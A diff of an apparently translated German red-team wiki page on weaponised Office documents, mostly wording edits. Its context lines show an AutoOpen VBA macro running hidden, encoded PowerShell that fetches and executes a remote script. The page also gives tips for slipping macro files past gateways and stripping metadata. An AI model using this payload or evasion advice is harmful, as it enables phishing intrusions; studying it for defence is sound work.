@@ -4,9 +4,9 @@
 
 ## Office-Dokumente
 
-Microsoft Word führt eine Datenvalidierung von Dateien durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung von Datenstrukturen gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.
+Microsoft Word führt eine Datenvalidierung der Datei durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung der Datenstruktur gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.
 
-In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateierweiterung geändert wird, und dennoch die Fähigkeit zur Ausführung von Makros beizubehalten.\
+In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateierweiterung ändert und dennoch die Fähigkeit zur Ausführung von Makros beibehält.\
 Zum Beispiel unterstützt eine RTF-Datei aus Designgründen keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
 Die gleichen internen Abläufe und Mechanismen gelten für alle Software der Microsoft Office Suite (Excel, PowerPoint usw.).
 
@@ -23,7 +23,7 @@ _**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Datein
 
 ![](<../../images/image (155).png>)
 
-### Makros-Hintertür
+### Makros Backdoor
 
 Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.
 
@@ -34,7 +34,7 @@ Je häufiger sie sind, desto wahrscheinlicher wird sie die AV erkennen.
 - AutoOpen()
 - Document_Open()
 
-#### Makros-Codebeispiele
+#### Makros Codebeispiele
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -66,12 +66,12 @@ proc.Create "powershell <beacon line generated>
 ```
 #### Manuell Metadaten entfernen
 
-Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, was den Dokumentinspektor öffnet. Klicke auf **Überprüfen** und dann auf **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.
+Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, um den Dokumentinspektor zu öffnen. Klicke auf **Überprüfen** und dann auf **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.
 
 #### Doc-Erweiterung
 
 Wenn du fertig bist, wähle im Dropdown-Menü **Speichern unter** den Typ **Word 97-2003 `.doc`**.\
-Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`**-Erweiterung gibt (z.B. hat das Miniaturansichts-Icon ein riesiges `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc`-Erweiterung der beste Kompromiss**.
+Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`**-Erweiterung gibt (z. B. hat das Miniaturansichts-Icon ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc`-Erweiterung der beste Kompromiss**.
 
 #### Bösartige Makro-Generatoren
 
@@ -144,9 +144,11 @@ Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung "aus der Ferne" zu erzw
 
 **Überprüfen Sie diese Ideen und mehr auf den folgenden Seiten:**
 
+
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
 {{#endref}}
+
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
